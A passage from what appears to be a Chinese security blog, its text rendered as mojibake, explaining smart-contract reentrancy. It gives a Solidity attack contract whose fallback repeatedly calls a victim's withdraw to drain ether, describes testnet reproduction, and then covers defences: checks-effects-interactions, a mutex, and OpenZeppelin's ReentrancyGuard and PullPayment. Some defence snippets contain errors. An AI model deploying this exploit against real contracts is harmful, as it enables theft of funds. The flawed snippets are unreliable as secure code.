id="æ”»å‡»åˆçº¦"><a href="#æ”»å‡»åˆçº¦" class="headerlink" title="æ”»å‡»åˆçº¦"></a>æ”»å‡»åˆçº¦</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>Victim public victim;<br><br>//è®¾å®šå—å®³è€…åˆçº¦åœ°å€<br>constructor(address _victimAddress) public &#123;<br>victim = Victim(_victimAddress);<br>&#125;<br><br>//é‡å†™fallback<br>fallback() external payable &#123;<br>if(address(victim).balance &gt;= 1 ether)&#123;<br>victim.withdraw(1 ether);<br>&#125;<br>&#125;<br><br>//æ”»å‡»ï¼Œè°ƒç”¨å—å®³è€…çš„withdrawå‡½æ•°<br>function attack() external payable &#123;<br>require(msg.value &gt;= 1 ether);<br>victim.deposit&#123;value: 1 ether&#125;();<br>victim.withdraw(1 ether);<br>&#125;<br><br>//æŸ¥è¯¢ä½™é¢<br>function getBalance() public view returns(uint) &#123;<br>return address(this).balance;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h2><h3 id="è™šæ‹Ÿæœºä¸­"><a href="#è™šæ‹Ÿæœºä¸­" class="headerlink" title="è™šæ‹Ÿæœºä¸­"></a>è™šæ‹Ÿæœºä¸­</h3><ul><li>åˆ†åˆ«ä¸ºå—å®³è€…å’Œæ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåˆçº¦</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111011420.png" alt="image-20211026111011420"></p><ul><li>ç”¨depositå‡½æ•°ä¸ºå—å®³è€…è®¾å®šä¸€å®šä½™é¢</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111204753.png" alt="image-20211026111204753"></p><ul><li>æ£€æŸ¥å—å®³è€…ä½™é¢</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111231368.png" alt="image-20211026111231368"></p><ul><li>è¿›è¡Œæ”»å‡»</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111416824.png" alt="image-20211026111416824"></p><ul><li>æ£€æŸ¥æ”»å‡»è€…å’Œå—å®³è€…çš„ä½™é¢</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111626852.png" alt="image-20211026111626852"></p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211026111639557.png" alt="image-20211026111639557"></p><h3 id="æµ‹è¯•é“¾ä¸Š"><a href="#æµ‹è¯•é“¾ä¸Š" class="headerlink" title="æµ‹è¯•é“¾ä¸Š"></a>æµ‹è¯•é“¾ä¸Š</h3><ul><li>éƒ¨ç½²å—å®³è€…åˆçº¦</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143200282.png" alt="image-20211030143200282"></p><ul><li><p>éƒ¨ç½²æ”»å‡»è€…åˆçº¦</p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030143902046.png" alt="image-20211030143902046"></p></li><li><p>ä¸ºå—å®³è€…åˆçº¦æ‰“å…¥2eth</p></li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030144202275.png" alt="image-20211030144202275"></p><ul><li>æ”»å‡»</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030151853031.png" alt="image-20211030151853031"></p><ul><li>ç»“æœ</li></ul><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152110108.png" alt="image-20211030152110108"></p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152151377.png" alt="image-20211030152151377"></p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211030152237814.png" alt="image-20211030152237814"></p><h3 id="é‡å…¥æ¬¡æ•°"><a href="#é‡å…¥æ¬¡æ•°" class="headerlink" title="é‡å…¥æ¬¡æ•°"></a>é‡å…¥æ¬¡æ•°</h3><p>ç”±äºgasçš„é™åˆ¶ï¼Œé‡å…¥æ¬¡æ•°æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„</p><p>è°ƒæ•´å‚æ•°ï¼Œå®éªŒå‡ºæœ€é«˜é‡å…¥æ¬¡æ•°</p><p>å¯ä»¥åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸ŠæŸ¥è¯¢åˆ°é‡å…¥çš„æ¬¡æ•°</p><p><img src="/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20211110234242078.png" alt="image-20211110234242078"></p><p>å¤§çº¦æ˜¯9æ¬¡</p><p>æ³¨æ„ï¼Œä¸€æ—¦ out of gas å°±ä¼šæ”»å‡»å¤±è´¥ã€‚</p><p>å¯ä»¥é€šè¿‡ä½¿ç”¨forå¾ªç¯ã€ç”¨å—å®³è€…åˆçº¦çš„æŸäº›çŠ¶æ€ã€ç”¨ifåˆ¤æ–­æ¥æ§åˆ¶é‡å…¥æ¬¡æ•°</p><h2 id="è§„é¿å»ºè®®"><a href="#è§„é¿å»ºè®®" class="headerlink" title="è§„é¿å»ºè®®"></a>è§„é¿å»ºè®®</h2><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>æ€»æ˜¯ç”¨ <code>send()</code>æˆ–<code>transfer()</code> æ¥å‘é€ etherï¼Œè€Œä¸æ˜¯ç”¨ <code>call.value()</code>ã€‚å› ä¸ºtransferå’Œsendå‡½æ•°çš„gasä»…æœ‰2300ï¼Œè¿™ç‚¹gasä»…å¤Ÿæ•è·ä¸€ä¸ªeventï¼Œæ‰€ä»¥å°†æ— æ³•è¿›è¡Œå¯é‡å…¥æ”»å‡»ã€‚</p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>ç¡®ä¿åœ¨æ‰§è¡Œå¤–éƒ¨è°ƒç”¨ä¹‹å‰å·²ç»æ›´æ–°äº†æ‰€æœ‰çš„å†…éƒ¨çŠ¶æ€ï¼Œè¿™ä¸€æ¨¡å¼è¢«ç§°ä¸ºï¼šChecks-Effects-Interactionsï¼ˆâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€ï¼‰</p><p>ç¬¬ä¸€æ­¥ï¼Œå¤§å¤šæ•°å‡½æ•°ä¼šå…ˆåšä¸€äº›æ£€æŸ¥å·¥ä½œï¼ˆä¾‹å¦‚è°è°ƒç”¨äº†å‡½æ•°ï¼Œå‚æ•°æ˜¯å¦åœ¨å–å€¼èŒƒå›´ä¹‹å†…ï¼Œå®ƒä»¬æ˜¯å¦å‘é€äº†è¶³å¤Ÿçš„ä»¥å¤ªå¸Ether ï¼Œç”¨æˆ·æ˜¯å¦å…·æœ‰tokenç­‰ç­‰ï¼‰ã€‚è¿™äº›æ£€æŸ¥å·¥ä½œåº”è¯¥é¦–å…ˆè¢«å®Œæˆã€‚</p><p>ç¬¬äºŒæ­¥ï¼Œå¦‚æœæ‰€æœ‰æ£€æŸ¥éƒ½é€šè¿‡äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œæ›´æ”¹åˆçº¦çŠ¶æ€å˜é‡çš„æ“ä½œã€‚</p><p>ç¬¬ä¸‰æ­¥ï¼Œä¸å…¶å®ƒåˆçº¦çš„äº¤äº’åº”è¯¥æ˜¯ä»»ä½•å‡½æ•°çš„æœ€åä¸€æ­¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(balances[msg.sender] &gt; amount); //æ£€æŸ¥<br>require(this.balance &gt; amount); //æ£€æŸ¥<br>balances[msg.sender] -= amount; // ç”Ÿæ•ˆ<br>to.call.value(amount)();  // äº¤äº’<br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><ol><li>ä½¿ç”¨äº’æ–¥é”ï¼šæ·»åŠ ä¸€ä¸ªåœ¨ä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­é”å®šåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå¯é˜²æ­¢é‡å…¥è°ƒç”¨</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool reEntrancyMutex = false;<br>function withdraw(uint _amount) public &#123;<br>require(!reEntrancyMutex);<br>reEntrancyMutex = true;<br>require(balances[msg.sender] &gt;= _amount);<br>msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>balances[msg.sender] -= _amount;<br>reEntrancyMutex = false;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨OpenZeppelinå®˜æ–¹çš„<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">ReentrancyGuardåˆçº¦</a>çš„<code>nonReentrant</code> modifierã€‚</li></ol><p>ä¸äº’æ–¥é”çš„æ€æƒ³å·®ä¸å¤šï¼Œä½†æ˜¯å…¶å®˜æ–¹å°†å…¶å°è£…æˆå‡½æ•°ä¿®é¥°è¯ä½¿ç”¨ã€‚</p><p>åœ¨å‡½æ•°ä¸­å¢åŠ <code>nonReentrant</code> modifierå¯ä¿è¯å…¶ä¸å¯é‡å…¥ï¼Œä»»ä½•å¯¹è¯¥å‡½æ•°çš„é‡å…¥æ“ä½œéƒ½å°†ä»¥revert the callçš„æ–¹å¼æ¥æ‹’ç»ã€‚</p><p>å½“åˆçº¦ä¸­æœ‰å¤šä¸ªå‡½æ•°æ—¶ï¼Œç”±äºmodifierçš„ç²’åº¦åœ¨å•ä¸ªå‡½æ•°ï¼Œè‹¥æƒ³å®Œå…¨é¿å…é‡å…¥ï¼Œåº”å¯¹æ¯ä¸ªå‡½æ•°éƒ½æ·»åŠ <code>nonReentrant</code> modifierã€‚å¦åˆ™ï¼Œä»ç„¶å¯ä»¥é€šè¿‡å…¶ä»–å‡½æ•°æ¥é‡å…¥ç„¶åå‘èµ·é‡å…¥æ”»å‡»ï¼Œè‹¥è¯¥å‡½æ•°å¯èƒ½ç ´åä¸å˜é‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.3.2 (security/ReentrancyGuard.sol)<br><br>pragma solidity ^0.8.0;<br><br>/**<br> * @dev Contract module that helps prevent reentrant calls to a function.<br> *<br> * Inheriting from `ReentrancyGuard` will make the &#123;nonReentrant&#125; modifier<br> * available, which can be applied to functions to make sure there are no nested<br> * (reentrant) calls to them.<br> *<br> * Note that because there is a single `nonReentrant` guard, functions marked as<br> * `nonReentrant` may not call one another. This can be worked around by making<br> * those functions `private`, and then adding `external` `nonReentrant` entry<br> * points to them.<br> *<br> * TIP: If you would like to learn more about reentrancy and alternative ways<br> * to protect against it, check out our blog post<br> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].<br> */<br>abstract contract ReentrancyGuard &#123;<br>    // Booleans are more expensive than uint256 or any type that takes up a full<br>    // word because each write operation emits an extra SLOAD to first read the<br>    // slot&#x27;s contents, replace the bits taken up by the boolean, and then write<br>    // back. This is the compiler&#x27;s defense against contract upgrades and<br>    // pointer aliasing, and it cannot be disabled.<br><br>    // The values being non-zero value makes deployment a bit more expensive,<br>    // but in exchange the refund on every call to nonReentrant will be lower in<br>    // amount. Since refunds are capped to a percentage of the total<br>    // transaction&#x27;s gas, it is best to keep them low in cases like this one, to<br>    // increase the likelihood of the full refund coming into effect.<br>    uint256 private constant _NOT_ENTERED = 1;<br>    uint256 private constant _ENTERED = 2;<br><br>    uint256 private _status;<br><br>    constructor() &#123;<br>        _status = _NOT_ENTERED;<br>    &#125;<br><br>    /**<br>     * @dev Prevents a contract from calling itself, directly or indirectly.<br>     * Calling a `nonReentrant` function from another `nonReentrant`<br>     * function is not supported. It is possible to prevent this from happening<br>     * by making the `nonReentrant` function external, and making it call a<br>     * `private` function that does the actual work.<br>     */<br>    modifier nonReentrant() &#123;<br>        // On the first call to nonReentrant, _notEntered will be true<br>        require(_status != _ENTERED, &quot;ReentrancyGuard: reentrant call&quot;);<br><br>        // Any calls to nonReentrant after this point will fail<br>        _status = _ENTERED;<br><br>        _;<br><br>        // By storing the original value once again, a refund is triggered (see<br>        // https://eips.ethereum.org/EIPS/eip-2200)<br>        _status = _NOT_ENTERED;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>ä½¿ç”¨é‡‡ç”¨pull paymentæ¨¡å¼ï¼ŒOpenZeppelinæä¾›äº†<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/PullPayment.sol">PullPaymentåˆçº¦</a>ã€‚</li></ol><p>å…¶æä¾›äº†<code>_asyncTransfer</code>å‡½æ•°ï¼Œä¸<code>transfer</code>ç±»ä¼¼ã€‚ç„¶è€Œï¼Œå®ƒä¸ä¼šå°†èµ„é‡‘å‘é€ç»™æ¥æ”¶è€…ï¼Œè€Œæ˜¯å°†å…¶è½¬ç§»åˆ°æ‰˜ç®¡åˆçº¦ä¸­ã€‚æ­¤å¤–ï¼ŒPullPaymentè¿˜ä¸ºæ¥æ”¶è€…æä¾›äº†ä¸€ä¸ªå…¬å…±åŠŸèƒ½æ¥æå–ï¼ˆpullï¼‰ä»–ä»¬çš„æ”¯ä»˜ï¼š<code>withdrawPayments</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../utils/escrow/Escrow.sol&quot;;<br><br>/**<br> * @dev Simple implementation of a<br> * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment]<br> * strategy, where the paying contract doesn&#x27;t interact directly with the<br> * receiver account, which must withdraw its payments itself.<br> *<br> * Pull-payments are often considered the best practice when it comes to sending<br> * Ether, security-wise. It prevents recipients from blocking execution, and<br> * eliminates reentrancy concerns.<br> *<br> * TIP: If you would like to learn more about reentrancy and alternative ways<br> * to protect against it, check out our blog post<br> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].<br> *<br> * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125;<br> * instead of Solidity&#x27;s `transfer` function. Payees can query their due<br> * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;.<br> */<br>abstract contract PullPayment &#123;<br>    Escrow private immutable _escrow;<br><br>    constructor() &#123;<br>        _escrow = new Escrow();<br>    &#125;<br><br>    /**<br>     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.<br>     *<br>     * Note that _any_ account can call this function, not just the `payee`.<br>     * This means that contracts unaware of the `PullPayment` protocol can still<br>     * receive funds this way, by having a separate account call<br>     * &#123;withdrawPayments&#125;.<br>     *<br>     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.<br>     * Make sure you trust the recipient, or are either following the<br>     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.<br>     *<br>     * @param payee Whose payments will be withdrawn.<br>     */<br>    function withdrawPayments(address payable payee) public virtual &#123;<br>        _escrow.withdraw(payee);<br>    &#125;<br><br>    /**<br>     * @dev Returns the payments owed to an address.<br>     * @param dest The creditor&#x27;s address.<br>     */<br>    function payments(address dest) public view returns (uint256) &#123;<br>        return _escrow.depositsOf(dest);<br>    &#125;<br><br>    /**<br>     * @dev Called by the payer to store the sent amount as credit to be pulled.<br>     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so<br>     * there is no danger of them being spent before withdrawal.<br>     *<br>     * @param dest The destination address of the funds.<br>     * @param amount The amount to transfer.<br>     */<br>    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;<br>        _escrow.deposit&#123;value: amount&#125;(dest);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œåˆçº¦èµ„é‡‘è¢«å‘é€ç»™ä¸­ä»‹æ‰˜ç®¡:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sendPayment(address user, address escrow) external &#123;<br>  require(msg.sender == authorized);  <br>  uint userBalance = userBalances[user];  <br>  require(userBalance &gt; 0);  <br>  userBalances[user] = 0;  <br>  (bool success,) = escrow.call&#123; value: userBalance &#125;(&quot;&quot;);<br>  require(success,);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œï¼Œæ‰˜ç®¡èµ„é‡‘å¯ä»¥ç”±æ¥æ”¶è€…æå–:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function pullPayment() external &#123;<br>  require(msg.sender == receiver);  <br>  uint payment = account(this).balance;  <br>  (bool success,) = msg.sender.call&#123; value: payment &#125;(&quot;&quot;);<br>  require(success,);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
